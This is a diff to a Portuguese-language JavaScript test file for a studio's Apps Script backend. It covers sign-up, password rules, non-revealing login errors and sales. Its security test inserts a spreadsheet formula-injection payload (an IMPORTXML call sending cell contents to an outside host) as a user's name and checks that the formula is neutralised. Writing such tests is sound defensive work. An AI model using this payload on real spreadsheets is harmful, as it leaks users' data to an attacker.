@@ -1,4 +1,6 @@
 const { criar } = require('./simulador.cjs');
+// endereço de exemplo (o cadastro do site exige endereço completo)
+const END_TESTE = { cep: '60150-160', endereco: 'Rua Eduardo Salgado', numero: '448', bairro: 'Aldeota', cidade: 'Fortaleza', uf: 'CE' };
 const R = require('path').join(__dirname, '..', 'apps-script');
 const m = criar([R+'/Codigo.gs', R+'/Seguranca.gs', R+'/Vales.gs', R+'/Bancada.gs', R+'/Relatorios.gs', R+'/Servicos.gs', R+'/Gestao.gs', R+'/Clientes.gs', R+'/Marketing.gs']);
 const { ctx, chamar, emails, chamadasIP } = m;
@@ -7,11 +9,11 @@ const ok = (c, msg, extra) => { if (!c) { falhas++; console.log('  ✗', msg, ex
 const linkDe = e => (e.body.match(/t=([a-f0-9]+)/) || [])[1];
 ctx.configurarPlanilha();
 console.log('— senha do aluno');
-let r = chamar('cadastrar', { cpf: '529.982.247-25', nome: 'Maria Souza', whatsapp: '85999990000', senha: 'abc12345' });
+let r = chamar('cadastrar', { endereco: END_TESTE, cpf: '529.982.247-25', nome: 'Maria Souza', whatsapp: '85999990000', senha: 'abc12345' });
 ok(!r.ok && /e-mail/.test(r.erro), 'cadastro exige e-mail', r);
-r = chamar('cadastrar', { cpf: '529.982.247-25', nome: 'Maria Souza', whatsapp: '85999990000', email: 'maria@gmail.com', senha: '123' });
+r = chamar('cadastrar', { endereco: END_TESTE, cpf: '529.982.247-25', nome: 'Maria Souza', whatsapp: '85999990000', email: 'maria@gmail.com', senha: '123' });
 ok(!r.ok && /8 caracteres/.test(r.erro), 'senha fraca recusada', r);
-r = chamar('cadastrar', { cpf: '529.982.247-25', nome: 'Maria Souza', whatsapp: '85999990000', email: 'maria@gmail.com', senha: 'abc12345' });
+r = chamar('cadastrar', { endereco: END_TESTE, cpf: '529.982.247-25', nome: 'Maria Souza', whatsapp: '85999990000', email: 'maria@gmail.com', senha: 'abc12345' });
 ok(r.ok, 'cadastro ok', r);
 const al = m.ss.getSheetByName('Alunos').rows;
 ok(String(al[1][4]).startsWith('v2$'), 'hash novo com pimenta (v2)');
@@ -66,7 +68,7 @@ r = chamar('b_esqueci', { email: 'naoexiste@x.com' }); ok(r.ok, 'esqueci da equi
 console.log('— alunos, vendas e agenda');
 r = chamar('b_novoAluno', { token: rec, cpf: '390.533.447-05', nome: 'Carla Dias', whatsapp: '85977776666', email: 'carla@gmail.com' });
 ok(r.ok && r.dados.conviteEnviado, 'aluno criado pela recepção + convite', r);
-r = chamar('entrar', { cpf: '39053344705', senha: 'qualquer1' }); ok(!r.ok && /criou sua senha/.test(r.erro), 'aluno sem senha é orientado', r);
+r = chamar('entrar', { cpf: '39053344705', senha: 'qualquer1' }); ok(!r.ok && /nunca criou uma senha/.test(r.erro) && r.erro === chamar('entrar', { cpf: '52998224725', senha: 'errada123' }).erro, 'aluno sem senha é orientado, com a mesma mensagem de senha errada (não revela quem é cliente)', r);
 r = chamar('b_vender', { token: rec, cpf: '39053344705', planoId: 'yoga-mensal-2x', metodo: 'Pix' });
 ok(r.ok && r.dados.valor === 350, 'venda no balcão (Pix R$ 350)', r);
 const aulasY = ctx.gerarAulas().filter(a => a.modalidade === 'Yoga');
@@ -189,7 +191,7 @@ r = chamar('b_sair', { token: rec }); r = chamar('b_resumo', { token: rec }); ok
 
 console.log('— segurança');
 const al2 = m.ss.getSheetByName('Alunos');
-r = chamar('cadastrar', { cpf: '862.883.667-57', nome: '=IMPORTXML("http://x.com/?a="&A1, "//a") Silva', whatsapp: '85999990001', email: 'x@gmail.com', senha: 'abc12345' });
+r = chamar('cadastrar', { endereco: END_TESTE, cpf: '862.883.667-57', nome: '=IMPORTXML("http://x.com/?a="&A1, "//a") Silva', whatsapp: '85999990001', email: 'x@gmail.com', senha: 'abc12345' });
 ok(r.ok && String(al2.rows[al2.rows.length - 1][1]).startsWith("'="), 'fórmula no nome é neutralizada', al2.rows[al2.rows.length - 1][1]);
 const tk = r.dados.token;
 ok(!m.ss.getSheetByName('Sessoes').rows.some(l => l[0] === tk), 'token não fica salvo em texto puro');
